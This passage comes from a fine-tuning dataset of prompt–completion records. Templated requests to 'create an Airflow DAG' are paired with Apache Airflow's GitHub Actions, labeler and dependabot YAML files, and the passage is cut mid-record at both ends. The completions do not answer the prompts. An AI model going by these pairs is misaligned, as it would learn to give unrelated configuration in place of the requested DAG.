\"composite\"\n  steps:\n    - name: \"Setup python\"\n      uses: actions/setup-python@v5\n      with:\n        python-version: ${{ inputs.python-version }}\n    # NOTE! Installing Breeze without using cache is FASTER than when using cache - uv is so fast and has\n    # so low overhead, that just running upload cache/restore cache is slower than installing it from scratch\n    - name: \"Install Breeze\"\n      shell: bash\n      run: ./scripts/ci/install_breeze.sh\n      env:\n        PYTHON_VERSION: \"${{ inputs.python-version }}\"\n    - name: \"Free space\"\n      shell: bash\n      run: breeze ci free-space\n      env:\n        AIRFLOW_ROOT_PATH: \"${{ github.workspace }}\"\n    - name: \"Get Python version\"\n      shell: bash\n      run: >\n        echo \"host-python-version=$(python -c 'import platform; print(platform.python_version())')\"\n        >> ${GITHUB_OUTPUT}\n      id: host-python-version\n    - name: \"Disable cheatsheet\"\n      shell: bash\n      run: breeze setup config --no-cheatsheet --no-asciiart\n      env:\n        AIRFLOW_ROOT_PATH: \"${{ github.workspace }}\"\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".github/actions/breeze/action.yml", "language": "yaml", "complexity": "simple", "star_count": 41237, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Licensed to the Apache Software Foundation (ASF) under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  The ASF licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an\n# \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n# KIND, either express or implied.  See the License for the\n# specific language governing permissions and limitations\n# under the License.\n#\n---\nname: 'Run migration tests'\ndescription: 'Runs migration tests'\ninputs:\n  python-version:\n    description: \"Python version to run the tests on\"\n    required: true\nruns:\n  using: \"composite\"\n  steps:\n    - name: \"Test migration file 2 to 3 migration: ${{env.BACKEND}}\"\n      shell: bash\n      run: |\n        breeze shell \"${AIRFLOW_2_CMD}\" --use-airflow-version 2.11.0 --answer y &&\n        breeze shell \"export AIRFLOW__DATABASE__EXTERNAL_DB_MANAGERS=${DB_MANGERS}\n                    ${AIRFLOW_3_CMD}\" --no-db-cleanup\n      env:\n        COMPOSE_PROJECT_NAME: \"docker-compose\"\n        DB_RESET: \"false\"\n        DB_MANAGERS: \"airflow.providers.fab.auth_manager.models.db.FABDBManager\"\n        AIRFLOW_2_CMD: >-\n          airflow db reset --skip-init -y &&\n          airflow db migrate --to-revision heads\n        AIRFLOW_3_CMD: >-\n          airflow db migrate --to-revision heads &&\n          airflow db downgrade -n 2.7.0 -y &&\n          airflow db migrate\n      # migration tests cannot be run with Python 3.13 now - currently we have no FAB and no FABDBManager -\n      # and airflow (correctly) refuses to migrate things to Airflow 2 when there is no \"ab_user\"\n      # table created. So migration tests for now will have to be excluded for Python 3.13 until\n      # we start working on 3.2 (with migration to 3.1) or until FAB is supported in 3.13 (FAB 5)\n      # TODO(potiuk) bring migration tests back for Python 3.13 when one of the two conditions are fulfilled\n      if: env.BACKEND != 'sqlite' && inputs.python-version != '3.13'\n    - name: \"Bring composer down\"\n      shell: bash\n      run: breeze down\n      env:\n        COMPOSE_PROJECT_NAME: \"docker-compose\"\n      if: inputs.python-version != '3.13'\n    - name: \"Test ORM migration 2 to 3: ${{env.BACKEND}}\"\n      shell: bash\n      run: >\n        breeze shell \"${AIRFLOW_2_CMD}\" --use-airflow-version 2.11.0 --answer y &&\n        breeze shell \"export AIRFLOW__DATABASE__EXTERNAL_DB_MANAGERS=${DB_MANGERS}\n             ${AIRFLOW_3_CMD}\" --no-db-cleanup\n      env:\n        COMPOSE_PROJECT_NAME: \"docker-compose\"\n        DB_RESET: \"false\"\n        DB_MANAGERS: \"airflow.providers.fab.auth_manager.models.db.FABDBManager\"\n        AIRFLOW_2_CMD: >-\n          airflow db reset -y\n        AIRFLOW_3_CMD: >-\n          airflow db migrate --to-revision heads &&\n          airflow db downgrade -n 2.7.0 -y &&\n          airflow db migrate\n      if: env.BACKEND != 'sqlite' && inputs.python-version != '3.13'\n    - name: \"Bring compose down again\"\n      shell: bash\n      run: breeze down\n      env:\n        COMPOSE_PROJECT_NAME: \"docker-compose\"\n      if: inputs.python-version != '3.13'\n    - name: \"Test ORM migration ${{env.BACKEND}}\"\n      shell: bash\n      run: >\n        breeze shell \"export AIRFLOW__DATABASE__EXTERNAL_DB_MANAGERS=${DB_MANAGERS} &&\n        airflow db reset -y &&\n        airflow db migrate --to-revision heads &&\n        airflow db downgrade -n 2.7.0 -y &&\n        airflow db migrate\"\n      env:\n        COMPOSE_PROJECT_NAME: \"docker-compose\"\n        DB_MANAGERS: \"airflow.providers.fab.auth_manager.models.db.FABDBManager\"\n      if: inputs.python-version != '3.13'\n    - name: \"Bring compose down again\"\n      shell: bash\n      run: breeze down\n      env:\n        COMPOSE_PROJECT_NAME: \"docker-compose\"\n      if: inputs.python-version != '3.13'\n    - name: \"Test offline migration ${{env.BACKEND}}\"\n      shell: bash\n      run: >\n        breeze shell\n        \"export AIRFLOW__DATABASE__EXTERNAL_DB_MANAGERS=${DB_MANAGERS} &&\n        airflow db reset -y &&\n        airflow db downgrade -n 2.7.0 -y &&\n        airflow db migrate -s\"\n      env:\n        COMPOSE_PROJECT_NAME: \"docker-compose\"\n        DB_MANAGERS: \"airflow.providers.fab.auth_manager.models.db.FABDBManager\"\n      if: env.BACKEND != 'sqlite' && inputs.python-version != '3.13'\n    - name: \"Bring any containers left down\"\n      shell: bash\n      run: breeze down\n      env:\n        COMPOSE_PROJECT_NAME: \"docker-compose\"\n      if: inputs.python-version != '3.13'\n    - name: \"Dump logs on failure ${{env.BACKEND}}\"\n      shell: bash\n      run: docker ps -q | xargs docker logs\n      if: failure()\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".github/actions/migration_tests/action.yml", "language": "yaml", "complexity": "medium", "star_count": 41237, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Licensed to the Apache Software Foundation (ASF) under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  The ASF licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an\n# \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n# KIND, either express or implied.  See the License for the\n# specific language governing permissions and limitations\n# under the License.\n#\n---\nname: 'Post tests on failure'\ndescription: 'Run post tests actions on failure'\nruns:\n  using: \"composite\"\n  steps:\n    - name: \"Upload airflow logs\"\n      uses: actions/upload-artifact@v4\n      with:\n        name: airflow-logs-${{env.JOB_ID}}\n        path: './files/airflow_logs*'\n        retention-days: 7\n        if-no-files-found: ignore\n    - name: \"Upload container logs\"\n      uses: actions/upload-artifact@v4\n      with:\n        name: container-logs-${{env.JOB_ID}}\n        path: \"./files/container_logs*\"\n        retention-days: 7\n        if-no-files-found: ignore\n    - name: \"Upload other logs\"\n      uses: actions/upload-artifact@v4\n      with:\n        name: container-logs-${{env.JOB_ID}}\n        path: \"./files/other_logs*\"\n        retention-days: 7\n        if-no-files-found: ignore\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".github/actions/post_tests_failure/action.yml", "language": "yaml", "complexity": "simple", "star_count": 41237, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Licensed to the Apache Software Foundation (ASF) under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  The ASF licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an\n# \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n# KIND, either express or implied.  See the License for the\n# specific language governing permissions and limitations\n# under the License.\n#\n---\nname: 'Prepare all CI images'\ndescription: 'Recreates current python CI images from artifacts for all python versions'\ninputs:\n  python-versions-list-as-string:\n    description: 'Stringified array of all Python versions to test - separated by spaces.'\n    required: true\n  docker-volume-location:\n    description: File system location where to move docker space to\n    default: /mnt/var-lib-docker\n  platform:\n    description: 'Platform for the build - linux/amd64 or linux/arm64'\n    required: true\nruns:\n  using: \"composite\"\n  steps:\n    # TODO: Currently we cannot loop through the list of python versions and have dynamic list of\n    #       tasks. Instead we hardcode all possible python versions and they - but\n    #       this should be implemented in stash action as list of keys to download.\n    #       That includes 3.9 - 3.12 as we are backporting it to v3-0-test branch\n    #       This is captured in https://github.com/apache/airflow/issues/45268\n    #       So we actually need 3.9 even if 3.9 support on main is dropped!\n    - name: \"Restore CI docker image ${{ inputs.platform }}:3.9\"\n      uses: ./.github/actions/prepare_single_ci_image\n      with:\n        platform: ${{ inputs.platform }}\n        python: \"3.9\"\n        python-versions-list-as-string: ${{ inputs.python-versions-list-as-string }}\n    - name: \"Restore CI docker image ${{ inputs.platform }}:3.10\"\n      uses: ./.github/actions/prepare_single_ci_image\n      with:\n        platform: ${{ inputs.platform }}\n        python: \"3.10\"\n        python-versions-list-as-string: ${{ inputs.python-versions-list-as-string }}\n    - name: \"Restore CI docker image ${{ inputs.platform }}:3.11\"\n      uses: ./.github/actions/prepare_single_ci_image\n      with:\n        platform: ${{ inputs.platform }}\n        python: \"3.11\"\n        python-versions-list-as-string: ${{ inputs.python-versions-list-as-string }}\n    - name: \"Restore CI docker image ${{ inputs.platform }}:3.12\"\n      uses: ./.github/actions/prepare_single_ci_image\n      with:\n        platform: ${{ inputs.platform }}\n        python: \"3.12\"\n        python-versions-list-as-string: ${{ inputs.python-versions-list-as-string }}\n    - name: \"Restore CI docker image ${{ inputs.platform }}:3.13\"\n      uses: ./.github/actions/prepare_single_ci_image\n      with:\n        platform: ${{ inputs.platform }}\n        python: \"3.13\"\n        python-versions-list-as-string: ${{ inputs.python-versions-list-as-string }}\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".github/actions/prepare_all_ci_images/action.yml", "language": "yaml", "complexity": "simple", "star_count": 41237, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Licensed to the Apache Software Foundation (ASF) under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  The ASF licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an\n# \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n# KIND, either express or implied.  See the License for the\n# specific language governing permissions and limitations\n# under the License.\n#\n---\nname: 'Prepare single CI image'\ndescription: >\n  Recreates current python image from artifacts (needed for the hard-coded actions calling all\n  possible Python versions in \"prepare_all_ci_images\" action. Hopefully we can get rid of it when\n  the https://github.com/apache/airflow/issues/45268 is resolved and we contribute capability of\n  downloading multiple keys to the stash action.\ninputs:\n  python:\n    description: 'Python version for image to prepare'\n    required: true\n  python-versions-list-as-string:\n    description: 'Stringified array of all Python versions to prepare - separated by spaces.'\n    required: true\n  platform:\n    description: 'Platform for the build - linux/amd64 or linux/arm64'\n    required: true\nruns:\n  using: \"composite\"\n  steps:\n    - name: \"Restore CI docker images ${{ inputs.platform }}:${{ inputs.python }}\"\n      uses: apache/infrastructure-actions/stash/restore@1c35b5ccf8fba5d4c3fdf25a045ca91aa0cbc468\n      with:\n        key: ci-image-save-v3-${{ inputs.platform }}-${{ inputs.python }}\n        path: \"/mnt/\"\n        only-current-branch: 'true'\n      if: contains(inputs.python-versions-list-as-string, inputs.python)\n    - name: \"Load CI image ${{ inputs.platform }}:${{ inputs.python }}\"\n      env:\n        PLATFORM: ${{ inputs.platform }}\n        PYTHON: ${{ inputs.python }}\n      run: breeze ci-image load --platform \"${PLATFORM}\" --python \"${PYTHON}\" --image-file-dir \"/mnt/\"\n      shell: bash\n      if: contains(inputs.python-versions-list-as-string, inputs.python)\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".github/actions/prepare_single_ci_image/action.yml", "language": "yaml", "complexity": "simple", "star_count": 41237, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation using Spark for big data processing\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Licensed to the Apache Software Foundation (ASF) under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  The ASF licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an\n# \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n# KIND, either express or implied.  See the License for the\n# specific language governing permissions and limitations\n# under the License.\n---\n# Details: https://github.com/kaxil/boring-cyborg\n\nlabelPRBasedOnFilePath:\n  provider:airbyte:\n    - providers/airbyte/**\n\n  provider:alibaba:\n    - providers/alibaba/**\n\n  provider:amazon:\n    - providers/amazon/**\n\n  provider:apache-beam:\n    - providers/apache/beam/**\n\n  provider:apache-cassandra:\n    - providers/apache/cassandra/**\n\n  provider:apache-drill:\n    - providers/apache/drill/**\n\n  provider:apache-druid:\n    - providers/apache/druid/**\n\n  provider:apache-flink:\n    - providers/apache/flink/**\n\n  provider:apache-hdfs:\n    - providers/apache/hdfs/**\n\n  provider:apache-hive:\n    - providers/apache/hive/**\n\n  provider:apache-iceberg:\n    - providers/apache/iceberg/**\n\n  provider:apache-impala:\n    - providers/apache/impala/**\n\n  provider:apache-kafka:\n    - providers/apache/kafka/**\n\n  provider:apache-kylin:\n    - providers/apache/kylin/**\n\n  provider:apache-livy:\n    - providers/apache/livy/**\n\n  provider:apache-pig:\n    - providers/apache/pig/**\n\n  provider:apache-pinot:\n    - providers/apache/pinot/**\n\n  provider:apache-spark:\n    - providers/apache/spark/**\n\n  provider:apache-tinkerpop:\n    - providers/apache/tinkerpop/**\n\n  provider:apprise:\n    - providers/apprise/**\n\n  provider:arangodb:\n    - providers/arangodb/**\n\n  provider:asana:\n    - providers/asana/**\n\n  provider:atlassian-jira:\n    - providers/atlassian/jira/**\n\n  provider:celery:\n    - providers/celery/**\n\n  provider:cloudant:\n    - providers/cloudant/**\n\n  provider:cncf-kubernetes:\n    - providers/cncf/kubernetes/**\n\n  provider:cohere:\n    - providers/cohere/**\n\n  provider:common-compat:\n    - providers/common/compat/**\n\n  provider:common-io:\n    - providers/common/io/**\n\n  provider:common-messaging:\n    - providers/common/messaging/**\n\n  provider:common-sql:\n    - providers/common/sql/**\n\n  provider:databricks:\n    - providers/databricks/**\n\n  provider:datadog:\n    - providers/datadog/**\n\n  provider:dbt-cloud:\n    - providers/dbt/cloud/**\n\n  provider:dingding:\n    - providers/dingding/**\n\n  provider:discord:\n    - providers/discord/**\n\n  provider:docker:\n    - providers/docker/**\n\n  provider:edge:\n    - providers/edge3/**\n\n  provider:elasticsearch:\n    - providers/elasticsearch/**\n\n  provider:exasol:\n    - providers/exasol/**\n\n  provider:fab:\n    - providers/fab/**\n\n  provider:facebook:\n    - providers/facebook/**\n\n  provider:ftp:\n    - providers/ftp/**\n\n  provider:git:\n    - providers/git/**\n\n  provider:github:\n    - providers/github/**\n\n  provider:google:\n    - providers/google/**\n\n  provider:grpc:\n    - providers/grpc/**\n\n  provider:hashicorp:\n    - providers/hashicorp/**\n\n  provider:http:\n    - providers/http/**\n\n  provider:imap:\n    - providers/imap/**\n\n  provider:influxdb:\n    - providers/influxdb/**\n\n  provider:jdbc:\n    - providers/jdbc/**\n\n  provider:jenkins:\n    - providers/jenkins/**\n\n  provider:keycloak:\n    - providers/keycloak/**\n\n  provider:microsoft-azure:\n    - providers/microsoft/azure/**\n\n  provider:microsoft-mssql:\n    - providers/microsoft/mssql/**\n\n  provider:microsoft-psrp:\n    - providers/microsoft/psrp/**\n\n  provider:microsoft-winrm:\n    - providers/microsoft/winrm/**\n\n  provider:mongo:\n    - providers/mongo/**\n\n  provider:mysql:\n    - providers/mysql/**\n\n  provider:neo4j:\n    - providers/neo4j/**\n\n  provider:odbc:\n    - providers/odbc/**\n\n  provider:openai:\n    - providers/openai/**\n\n  provider:openfaas:\n    - providers/openfaas/**\n\n  provider:openlineage:\n    - providers/openlineage/**\n\n  provider:opensearch:\n    - providers/opensearch/**\n\n  provider:opsgenie:\n    - providers/opsgenie/**\n\n  provider:oracle:\n    - providers/oracle/**\n\n  provider:pagerduty:\n    - providers/pagerduty/**\n\n  provider:papermill:\n    - providers/papermill/**\n\n  provider:pgvector:\n    - providers/pgvector/**\n\n  provider:pinecone:\n    - providers/pinecone/**\n\n  provider:postgres:\n    - providers/postgres/**\n\n  provider:presto:\n    - providers/presto/**\n\n  provider:qdrant:\n    - providers/qdrant/**\n\n  provider:redis:\n    - providers/redis/**\n\n  provider:salesforce:\n    - providers/salesforce/**\n\n  provider:samba:\n    - providers/samba/**\n\n  provider:segment:\n    - providers/segment/**\n\n  provider:sendgrid:\n    - providers/sendgrid/**\n\n  provider:sftp:\n    - providers/sftp/**\n\n  provider:singularity:\n    - providers/singularity/**\n\n  provider:slack:\n    - providers/slack/**\n\n  provider:smtp:\n    - providers/smtp/**\n\n  provider:snowflake:\n    - providers/snowflake/**\n\n  provider:sqlite:\n    - providers/sqlite/**\n\n  provider:ssh:\n    - providers/ssh/**\n\n  provider:standard:\n    - providers/standard/**\n\n  provider:tableau:\n    - providers/tableau/**\n\n  provider:telegram:\n    - providers/telegram/**\n\n  provider:teradata:\n    - providers/teradata/**\n\n  provider:trino:\n    - providers/trino/**\n\n  provider:vertica:\n    - providers/vertica/**\n\n  provider:weaviate:\n    - providers/weaviate/**\n\n  provider:yandex:\n    - providers/yandex/**\n\n  provider:ydb:\n    - providers/ydb/**\n\n  provider:zendesk:\n    - providers/zendesk/**\n\n  area:API:\n    - airflow-core/src/airflow/api/**/*\n    - airflow-core/src/airflow/api_fastapi/**/*\n    - clients/**/*\n    - airflow-core/docs/stable-rest-api-ref.rst\n    - airflow-core/tests/unit/api_fastapi/**/*\n\n  area:dev-tools:\n    - scripts/**/*\n    - dev/**/*\n    - .github/**/*\n    - Dockerfile.ci\n    - CONTRIBUTING.rst\n    - contributing-docs/**/*\n    - yamllint-config.yml\n    - .asf.yaml\n    - .bash_completion\n    - .dockerignore\n    - .hadolint.yaml\n    - .pre-commit-config.yaml\n    - .rat-excludes\n    - .readthedocs.yml\n\n  # This should be copy of the \"area:dev-tools\" above and should be updated when we switch maintenance branch\n  backport-to-v3-0-test:\n    - scripts/**/*\n    - dev/**/*\n    - .github/**/*\n    - Dockerfile.ci\n    - CONTRIBUTING.rst\n    - contributing-docs/**/*\n    - yamllint-config.yml\n    - .asf.yaml\n    - .bash_completion\n    - .dockerignore\n    - .hadolint.yaml\n    - .pre-commit-config.yaml\n    - .rat-excludes\n    - .readthedocs.yml\n\n\n  kind:documentation:\n    - airflow-core/docs/**/*\n    - chart/docs/**/*\n    - devel-common/src/docs/**/*\n    - providers/**/docs/**/*\n    - providers-summary-docs/**/*\n    - docker-stack-docs/**/*\n\n  area:helm-chart:\n    - chart/**/*\n\n  area:UI:\n    - airflow-core/docs/ui.rst\n    - airflow-core/src/airflow/ui/**/*\n\n  area:translations:\n    - airflow-core/src/airflow/ui/public/i18n/**/*\n\n  translation:default:\n    - airflow-core/src/airflow/ui/public/i18n/locales/en/*\n\n  translation:ar:\n    - airflow-core/src/airflow/ui/public/i18n/locales/ar/*\n\n  translation:de:\n    - airflow-core/src/airflow/ui/public/i18n/locales/de/*\n\n  translation:es:\n    - airflow-core/src/airflow/ui/public/i18n/locales/es/*\n\n  translation:fr:\n    - airflow-core/src/airflow/ui/public/i18n/locales/fr/*\n\n  translation:he:\n    - airflow-core/src/airflow/ui/public/i18n/locales/he/*\n\n  translation:ko:\n    - airflow-core/src/airflow/ui/public/i18n/locales/ko/*\n\n  translation:nl:\n    - airflow-core/src/airflow/ui/public/i18n/locales/nl/*\n\n  translation:pl:\n    - airflow-core/src/airflow/ui/public/i18n/locales/pl/*\n\n  translation:zh-TW:\n    - airflow-core/src/airflow/ui/public/i18n/locales/zh-TW/*\n\n  area:CLI:\n    - airflow-core/src/airflow/cli/**/*.py\n    - airflow-core/tests/unit/cli/**/*.py\n    - airflow-core/docs/cli-and-env-variables-ref.rst\n    - airflow-core/docs/howto/usage-cli.rst\n\n  area:Lineage:\n    - airflow-core/src/airflow/lineage/**/*\n    - airflow-core/tests/unit/lineage/**/*\n    - airflow-core/docs/administration-and-deployment/lineage.rst\n\n  area:Logging:\n    - airflow-core/src/airflow/config_templates/airflow_local_settings.py\n    - airflow-core/tests/unit/core/test_logging_config.py\n    - airflow-core/src/airflow/utils/log/**/*\n    - airflow-core/docs/administration-and-deployment/logging-monitoring/logging-*.rst\n    - airflow-core/tests/unit/utils/log/**/*\n    - providers/**/log/*\n\n  area:ConfigTemplates:\n    - airflow-core/src/airflow/config_templates/*\n\n  area:Plugins:\n    - airflow-core/src/airflow/cli/commands/plugins_command.py\n    - airflow-core/src/airflow/plugins_manager.py\n    - airflow-core/tests/unit/cli/commands/test_plugins_command.py\n    - airflow-core/tests/unit/plugins/**/*\n    - airflow-core/docs/administration-and-deployment/plugins.rst\n\n  area:Scheduler:\n    - airflow-core/src/airflow/jobs/scheduler_job_runner.py\n    - airflow-core/docs/administration-and-deployment/scheduler.rst\n    - airflow-core/tests/unit/jobs/test_scheduler_job.py\n\n  area:DAG-processing:\n    - airflow-core/src/airflow/dag_processing/**/*\n    - airflow-core/src/airflow/jobs/dag_processor_job_runner.py\n    - airflow-core/docs/administration-and-deployment/dagfile-processing.rst\n    - airflow-core/tests/unit/dag_processing/**/*\n\n  area:Executors-core:\n    - airflow-core/src/airflow/executors/**/*\n    - airflow-core/docs/core-concepts/executor/**/*\n    - airflow-core/tests/unit/executors/**/*\n\n  area:Secrets:\n    - airflow-core/src/airflow/secrets/**/*\n    - airflow-core/tests/unit/secrets/**/*\n    - providers/**/secrets/*\n    - airflow-core/docs/security/secrets/**/*\n\n  area:Triggerer:\n    - airflow-core/src/airflow/cli/commands/triggerer_command.py\n    - airflow-core/src/airflow/jobs/triggerer_job_runner.py\n    - airflow-core/src/airflow/models/trigger.py\n    - providers/standard/src/airflow/providers/standard/triggers/**/*\n    - airflow-core/tests/unit/cli/commands/test_triggerer_command.py\n    - airflow-core/tests/unit/jobs/test_triggerer_job.py\n    - airflow-core/tests/unit/models/test_trigger.py\n    - providers/standard/tests/unit/standard/triggers/**/*\n\n  area:Serialization:\n    - airflow-core/src/airflow/serialization/**/*\n    - airflow-core/src/airflow/models/serialized_dag.py\n    - airflow-core/tests/unit/serialization/**/*\n    - airflow-core/tests/unit/models/test_serialized_dag.py\n    - airflow-core/docs/administration-and-deployment/dag-serialization.rst\n\n  area:core-operators:\n    - airflow-core/src/airflow/hooks/**/*\n    - airflow-core/src/airflow/sensors/**/*\n    - airflow-core/tests/unit/hooks/**/*\n    - airflow-core/tests/unit/sensors/**/*\n    - airflow-core/docs/operators-and-hooks-ref.rst\n    - airflow-core/docs/howto/operator/*\n\n  area:production-image:\n    - Dockerfile\n    - docker-stack-docs/**/*\n    - docker-tests/**/*\n\n  area:system-tests:\n    - airflow-core/tests/system/**/*\n\n  area:task-sdk:\n    - task-sdk/**/*\n\n  area:go-sdk:\n    - go-sdk/**/*\n\n  area:db-migrations:\n    - airflow-core/src/airflow/migrations/versions/*\n\n  area:providers:\n    - providers/**/*\n\n  area:airflow-ctl:\n    - airflow-ctl/**/*\n\n  area:docker-tests:\n    - docker-tests/**/*\n\n  area:kubernetes-tests:\n    - kubernetes-tests/**/*\n\n# Various Flags to control behaviour of the \"Labeler\"\nlabelerFlags:\n  # If this flag is changed to 'false', labels would only be added when the PR is first created\n  # and not when existing PR is updated.\n  # The default is 'true' which means the labels would be added when PR is updated even if they\n  # were removed by the user\n  labelOnPRUpdates: false\n\n# Comment to be posted to welcome users when they open their first PR\nfirstPRWelcomeComment: >\n  Congratulations on your first Pull Request and welcome to the Apache Airflow community!\n  If you have any issues or are unsure about any anything please check our\n  Contributors' Guide (https://github.com/apache/airflow/blob/main/contributing-docs/README.rst)\n\n  Here are some useful points:\n\n  - Pay attention to the quality of your code (ruff, mypy and type annotations). Our [pre-commits](\n  https://github.com/apache/airflow/blob/main/contributing-docs/08_static_code_checks.rst#prerequisites-for-pre-commit-hooks)\n  will help you with that.\n\n  - In case of a new feature add useful documentation (in docstrings or in `docs/` directory).\n  Adding a new operator? Check this short\n  [guide](https://github.com/apache/airflow/blob/main/airflow-core/docs/howto/custom-operator.rst)\n  Consider adding an example DAG that shows how users should use it.\n\n  - Consider using [Breeze environment](https://github.com/apache/airflow/blob/main/dev/breeze/doc/README.rst)\n  for testing locally, it's a heavy docker but it ships with a working Airflow and a lot of integrations.\n\n  - Be patient and persistent. It might take some time to get a review or get the final approval from\n  Committers.\n\n  - Please follow [ASF Code of Conduct](https://www.apache.org/foundation/policies/conduct) for all\n  communication including (but not limited to) comments on Pull Requests, Mailing list and Slack.\n\n  - Be sure to read the [Airflow Coding style](\n  https://github.com/apache/airflow/blob/main/contributing-docs/05_pull_requests.rst#coding-style-and-best-practices).\n\n  - Always keep your Pull Requests rebased, otherwise your build might fail due to changes not related\n  to your commits.\n\n  Apache Airflow is a community-driven project and together we are making it better 🚀.\n\n  In case of doubts contact the developers at:\n\n  Mailing List: dev@airflow.apache.org\n\n  Slack: https://s.apache.org/airflow-slack\n\n# Comment to be posted to congratulate user on their first merged PR\nfirstPRMergeComment: >\n  Awesome work, congrats on your first merged pull request! You are invited to check our\n  [Issue Tracker](https://github.com/apache/airflow/issues) for additional contributions.\n\n# Comment to be posted to on first time issues\nfirstIssueWelcomeComment: >\n  Thanks for opening your first issue here! Be sure to follow the issue template!\n  If you are willing to raise PR to address this issue please do so, no need to wait for approval.\n\ncheckUpToDate:\n  targetBranch: main\n  files: []\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".github/boring-cyborg.yml", "language": "yaml", "complexity": "complex", "star_count": 41237, "quality_score": 0.92, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Licensed to the Apache Software Foundation (ASF) under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  The ASF licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an\n# \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n# KIND, either express or implied.  See the License for the\n# specific language governing permissions and limitations\n# under the License\n---\nversion: 2\nupdates:\n  - package-ecosystem: pip\n    directories:\n      - /airflow-core\n      - /airflow-ctl\n      - /clients/python\n      - /dev/breeze\n      - /docker-tests\n      - /kubernetes-tests\n      - /helm-tests\n      - /task-sdk\n      - /\n    schedule:\n      interval: daily\n\n  - package-ecosystem: npm\n    directories:\n      - /airflow-core/src/airflow/ui\n    schedule:\n      interval: daily\n    groups:\n      core-ui-package-updates:\n        patterns:\n          - \"*\"\n\n  - package-ecosystem: npm\n    directories:\n      - /airflow-core/src/airflow/api_fastapi/auth/managers/simple/ui\n    schedule:\n      interval: daily\n    groups:\n      core-ui-package-updates:\n        patterns:\n          - \"*\"\n  - package-ecosystem: npm\n    directories:\n      - /providers/fab/src/airflow/providers/fab/www\n    schedule:\n      interval: daily\n    groups:\n      fab-ui-package-updates:\n        patterns:\n          - 